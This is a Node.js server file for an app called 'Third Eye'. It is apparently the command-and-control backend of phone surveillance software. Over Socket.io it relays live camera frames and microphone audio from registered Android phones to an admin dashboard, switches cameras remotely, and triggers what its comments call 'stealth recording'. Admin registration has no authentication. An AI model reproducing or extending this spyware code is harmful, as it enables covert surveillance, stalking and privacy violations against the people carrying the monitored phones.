require('dotenv').config();
const fs = require('fs');
if (fs.existsSync('/etc/secrets/.env')) {
  require('dotenv').config({ path: '/etc/secrets/.env' });
}
const express = require('express');
const cors = require('cors');
const morgan = require('morgan');
const path = require('path');
const mongoose = require('mongoose');

const http = require('http');
const { Server } = require('socket.io');

const deviceRoutes = require('./routes/deviceRoutes');
const videoRoutes = require('./routes/videoRoutes');
const adminRoutes = require('./routes/adminRoutes');
const Device = require('./models/Device');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 5e6, // 5MB buffer for video frames
});

const PORT = process.env.PORT || 5000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/thirdeye';

// Middleware
app.use(cors({ origin: '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(morgan('dev'));

// Static files for uploads
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Connected devices tracking
const connectedDevices = new Map();
const socketToDevice = new Map();

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    timestamp: new Date(),
    mongoConnected: mongoose.connection.readyState === 1,
    onlineDevicesCount: connectedDevices.size,
  });
});

// API Routes
app.use('/api/device', deviceRoutes);
app.use('/api/devices', deviceRoutes);
app.use('/api/videos', videoRoutes);
app.use('/api/admin', adminRoutes);

// Socket.io Real-Time Live Streaming & Command Events
io.on('connection', (socket) => {
  // Device registration from Android phone
  socket.on('register-device', async ({ deviceId, deviceName, batteryLevel }) => {
    socket.join(`device_${deviceId}`);
    socket.join('devices');
    const now = new Date();
    connectedDevices.set(deviceId, {
      socketId: socket.id,
      deviceId,
      deviceName: deviceName || 'Android Device',
      batteryLevel: batteryLevel !== undefined ? batteryLevel : 100,
      isStreaming: false,
      lastSeen: now,
    });
    socketToDevice.set(socket.id, deviceId);
    console.log(`📱 Device registered on Socket: ${deviceId} (${deviceName || 'Android'})`);

    // Keep MongoDB lastSeen up to date
    try {
      await Device.findOneAndUpdate(
        { deviceId },
        { lastSeen: now, ...(batteryLevel !== undefined ? { batteryLevel } : {}) }
      );
    } catch (e) {
      console.error('Error updating device lastSeen on register:', e.message);
    }

    // Notify admins that this device is live
    io.to('admins').emit('device-status-change', {
      deviceId,
      isOnline: true,
      lastSeen: now,
      batteryLevel: batteryLevel !== undefined ? batteryLevel : 100,
    });
  });

  // Device periodic heartbeat (every 20s from phone)
  socket.on('device-heartbeat', async ({ deviceId, batteryLevel }) => {
    if (!deviceId) return;
    const now = new Date();
    const dev = connectedDevices.get(deviceId);
    if (dev) {
      dev.lastSeen = now;
      if (batteryLevel !== undefined) dev.batteryLevel = batteryLevel;
    }

    try {
      await Device.findOneAndUpdate(
        { deviceId },
        { lastSeen: now, ...(batteryLevel !== undefined ? { batteryLevel } : {}) }
      );
    } catch (e) {
      // ignore
    }

    io.to('admins').emit('device-heartbeat', {
      deviceId,
      lastSeen: now,
      batteryLevel,
      isOnline: true,
    });
  });

  // Admin registration from React dashboard
  socket.on('register-admin', () => {
    socket.join('admins');
    // Send list of currently online socket devices
    socket.emit('online-devices-list', Array.from(connectedDevices.keys()));
  });

  // Admin requests to watch live stream for a device
  socket.on('request-live-stream', ({ deviceId, camera = 'BACK' }) => {
    console.log(`🎥 Live stream requested for ${deviceId} (Lens: ${camera})`);
    socket.join(`watch_${deviceId}`);

    const dev = connectedDevices.get(deviceId);
    if (!dev) {
      socket.emit('stream-error', { deviceId, error: 'Device is offline' });
      return;
    }

    dev.isStreaming = true;
    io.to(`device_${deviceId}`).emit('start-live-stream', {
      adminSocketId: socket.id,
      camera,
    });
  });

  // Phone sends a compressed video frame
  socket.on('stream-frame', (data) => {
    if (data && data.deviceId) {
      // Forward frame to all admins watching this device
      socket.to(`watch_${data.deviceId}`).emit('live-frame', {
        deviceId: data.deviceId,
        frame: data.frame,
        timestamp: Date.now(),
      });
    }
  });

  // Phone sends real-time microphone audio chunk (PCM)
  socket.on('stream-audio', (data) => {
    if (data && data.deviceId) {
      // Forward audio to all admins watching this device
      socket.to(`watch_${data.deviceId}`).emit('live-audio', {
        deviceId: data.deviceId,
        audio: data.audio,
        sampleRate: data.sampleRate || 16000,
        channels: data.channels || 1,
        timestamp: Date.now(),
      });
    }
  });

  // Admin stops watching a device
  socket.on('stop-watching-device', ({ deviceId }) => {
    socket.leave(`watch_${deviceId}`);
    const room = io.sockets.adapter.rooms.get(`watch_${deviceId}`);
    if (!room || room.size === 0) {
      console.log(`🛑 All admins left, stopping live stream on: ${deviceId}`);
      io.to(`device_${deviceId}`).emit('stop-live-stream');
      const dev = connectedDevices.get(deviceId);
      if (dev) dev.isStreaming = false;
    }
  });

  // Switch camera remotely (FRONT <-> BACK)
  socket.on('switch-camera', ({ deviceId, camera }) => {
    console.log(`🔄 Remote switch camera for ${deviceId} -> ${camera}`);
    io.to(`device_${deviceId}`).emit('switch-camera', { camera });
  });

  // Admin remotely triggers stealth recording on phone
  socket.on('start-remote-recording', ({ deviceId }) => {
    console.log(`⏺️ Remote recording requested for: ${deviceId}`);
    io.to(`device_${deviceId}`).emit('start-remote-recording');
  });

  // Admin remotely stops stealth recording on phone
  socket.on('stop-remote-recording', ({ deviceId }) => {
    console.log(`⏹️ Remote recording stop requested for: ${deviceId}`);
    io.to(`device_${deviceId}`).emit('stop-remote-recording');
  });

  // Disconnect handler
  socket.on('disconnect', async () => {
    const deviceId = socketToDevice.get(socket.id);
    if (deviceId) {
      connectedDevices.delete(deviceId);
      socketToDevice.delete(socket.id);
      const now = new Date();
      console.log(`📱 Device disconnected from Socket: ${deviceId}`);

      try {
        await Device.findOneAndUpdate({ deviceId }, { lastSeen: now });
      } catch (e) {}

      io.to('admins').emit('device-status-change', {
        deviceId,
        isOnline: false,
        lastSeen: now,
      });
      io.to(`watch_${deviceId}`).emit('stream-ended', { deviceId, reason: 'Device disconnected' });
    }
  });
});

// Connect to MongoDB & Start Server
mongoose
  .connect(MONGODB_URI)
  .then(() => {
    console.log('✅ Connected to MongoDB successfully.');
  })
  .catch((err) => {
    console.error('⚠️ MongoDB connection error:', err.message);
    console.log('💡 Tip: Ensure MongoDB service is running');
  });

server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Third Eye Server running on http://0.0.0.0:${PORT}`);
  console.log(`📡 WebSocket & Video Streaming Ready.`);
});
